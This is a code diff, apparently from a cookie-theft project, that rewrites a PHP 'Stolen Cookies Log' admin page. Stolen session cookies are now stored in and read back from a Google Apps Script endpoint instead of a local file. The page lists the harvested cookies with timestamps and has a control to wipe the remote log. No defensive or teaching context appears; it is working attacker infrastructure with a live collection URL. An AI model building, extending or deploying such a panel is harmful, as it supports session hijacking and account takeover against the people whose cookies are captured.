@@ -50,29 +50,45 @@
         <h1>Stolen Cookies Log</h1>
 
         <?php
-        $logFile = 'stolen_cookies.txt';
+        // Ganti dengan URL Web App Google Apps Script Anda
+        $sheetApiUrl = 'https://script.google.com/macros/s/AKfycbzQrtVwuR69C7QmuBaVCgzScijvxQdVyWjDqYxKl-ctE84XzGV3idjvnq6Y0wW58cw/exec';
         $deleteAction = false;
 
-        // Handle delete request
+        // Handle delete request (clear Google Sheet)
         if (isset($_POST['delete'])) {
-            if (file_exists($logFile)) {
-                file_put_contents($logFile, ''); // Clear the file contents
-                $deleteAction = true;
-                echo '<p style="color: green;">Log file contents have been cleared.</p>';
+            $clearUrl = $sheetApiUrl . '?action=clear';
+            $result = @file_get_contents($clearUrl);
+            $deleteAction = true;
+            if ($result === false) {
+                echo '<p style="color: red;">Failed to clear log data on Google Sheets.</p>';
             } else {
-                echo '<p style="color: red;">Log file does not exist.</p>';
+                echo '<p style="color: green;">Log data on Google Sheets has been cleared.</p>';
             }
         }
         ?>
 
         <h2>Log Entries:</h2>
         <?php
-        if (file_exists($logFile) && filesize($logFile) > 0) {
-            $fileContent = file_get_contents($logFile);
-            echo '<pre>' . htmlspecialchars($fileContent) . '</pre>';
+        // Ambil data log dari Google Sheets
+        $logData = @file_get_contents($sheetApiUrl);
+        if ($logData !== false && !$deleteAction) {
+            $logArray = json_decode($logData, true);
+            if (is_array($logArray) && count($logArray) > 0) {
+                echo '<pre>';
+                foreach ($logArray as $row) {
+                    // Format: [timestamp] Cookie: value
+                    if (count($row) >= 2) {
+                        echo '[' . htmlspecialchars($row[0]) . '] Cookie: ' . htmlspecialchars($row[1]) . "\n";
+                    }
+                }
+                echo '</pre>';
+            } else {
+                echo '<p>No cookies have been logged yet.</p>';
+            }
         } elseif (!$deleteAction) {
             echo '<p>No cookies have been logged yet.</p>';
         }
+        
         ?>
 
         <form method="post" class="delete-form">
